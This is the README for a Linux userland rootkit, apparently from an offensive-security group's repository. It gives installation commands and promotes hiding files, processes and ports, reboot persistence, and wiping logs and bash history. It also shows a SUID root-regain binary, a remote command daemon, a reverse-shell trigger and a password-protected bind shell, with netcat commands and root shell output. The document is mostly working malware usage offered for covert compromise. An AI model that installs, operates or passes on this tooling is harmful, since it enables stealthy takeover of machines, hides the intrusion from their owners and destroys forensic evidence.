====================BDS Linux Userland Rootkit===================================
Developed by : Antonius
Website : www.bluedragonsec.com
Github : https://github.com/bluedragonsecurity
Twitter : https://twitter.com/bluedragonsec

====FEATURES====

- Hide files and directories
- Hide process
- Hide bind shell port, bds daemon port and reverse shell port from netstat
- Rootkit persistence to survive after reboot
- clean logs and bash history during installation

====INSTALLATION====

In case you have installed gcc, install it by running the installer script:
______________________

./install.sh direct
______________________

In case you haven't installed gcc, install it by running the installer script :
_________________________

./install.sh
_________________________

====USING THE ROOTKIT=====

==Privilege Escalation

Once the rootkit installed on the system, in case you lost root privilege, you can regain root privilege by typing :
______________________

/opt/bds_elf/bds_suid
______________________

________________________________________________________________________________________________________________________________________

robotsoft@robotsoft:~$ id
uid=1000(robotsoft) gid=1000(robotsoft) groups=1000(robotsoft),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),999(sambashare)
robotsoft@robotsoft:~$ /opt/bds_elf/bds_suid
root@robotsoft:~# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),999(sambashare),1000(robotsoft)
root@robotsoft:~# 
__________________________________________________________________________________________________________________________________________

==Using the Rootkit Daemon

Rootkit built in daemon is listening on port 31335. Using the rootkit built in daemon, you can issue a reverse shell connection and executing linux command on target machine (which you have installed rootkit) remotely. To connect to rootkit daemon, open your terminal and type :
_________________________

nc "target ip" 31335
_________________________  


Example :

You have installed bds userland on ip address 192.168.43.36 , open terminal and type:
_____________________________________________________
robotsoft@robotsoft:~$ nc 192.168.43.36 31335
CMD :
Type any linux command in cmd prompt
robotsoft@robotsoft:~$ nc 192.168.43.36 31335
CMD :id
uid=0(root) gid=0(root) groups=0(root)
CMD :uname -a
Linux robotsoft 5.11.0-49-generic #55-Ubuntu SMP Wed Jan 12 17:36:34 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
CMD :pwd
/
CMD :
______________________________________________________

==Activating Reverse Shell

To activate reverse shell, you need to set up a port listener using netcat on port 31337, then connect to bds daemon on your target server (with rootkit installed) on port 31335.
On your machine, open terminal and type:
___________________

nc -l -p 31337 -v
___________________

Open another terminal tab and connect to target server on port 31335 :
____________________
nc "server ip" 31335
____________________

then type : 
________________________________________

/opt/bds_elf/bds_bc "your ip address"
________________________________________

Wait a few seconds and you will get reverse shell port connection from your target server.

Example :
Server ip address with rootkit installed is at 192.168.43.36, your local machine ip is at 192.168.43.230. Open terminal on your local machine and set up port listener on port 31337:
___________________________________________

robotsoft@robotsoft:~$ nc -l -p 31337 -v
  Listening on 0.0.0.0 31337
___________________________________________

Open another terminal and connect to daemon on target machine (which you have installed rootkit) :

_______________________________________________
robotsoft@robotsoft:~$ nc 192.168.43.36 31335
CMD :/opt/bds_elf/bds_bc 192.168.43.230
CMD :
_______________________________________________

Back on your previous netcat listener, you will receive a reverse shell connection :
______________________________________

root@robotsoft:~# nc -l -p 31337 -v
Listening on 0.0.0.0 31337
Connection received on 192.168.43.36 42012
Linux robotsoft-virtualbox 6.2.0-20-generic #20-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  6 07:48:48 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux robotsoft-virtualbox 6.2.0-20-generic #20-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  6 07:48:48 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
_______________________________________

Connecting to Bind Shell Port

Bind shell port on server (which you have installed rootkit) is at port 31337, the password is bluedragonsec. You can connect to bind shell port using netcat :
______________________________________
nc "server ip address" 31337
then type the password : bluedragonsec  
______________________________________

Example :

Server ip address (with bds userland rootkit installed) is at 192.168.43.36.
______________________________________________

robotsoft@robotsoft:~$ nc 192.168.43.36 31337
Password :bluedragonsec
Linux robotsoft-virtualbox 6.2.0-20-generic #20-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  6 07:48:48 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux robotsoft-virtualbox 6.2.0-20-generic #20-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  6 07:48:48 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
______________________________________________

==Hiding Files and Directories

To hide file and directory just give prefix bds_ to file name and directory name

==How to Clean Logs and Bash History ?

Before running installation script, add username to usernames_to_clear_logs.txt in new line, example:
_____________
root
robotsoft
_____________

User logs will be cleaned during rootkit installation

==Process Hiding

This rootkit hides bind shell process, reverse shell process and rootkit built-in daemon process.

==Port Hiding

This rootkit hides bind shell port, reverse shell port and rootkit built-in daemon port.

==Persistence

The rootkit is activated every time the system starts up. After the reboot, wait for 2 minutes, the rootkit will be activated.
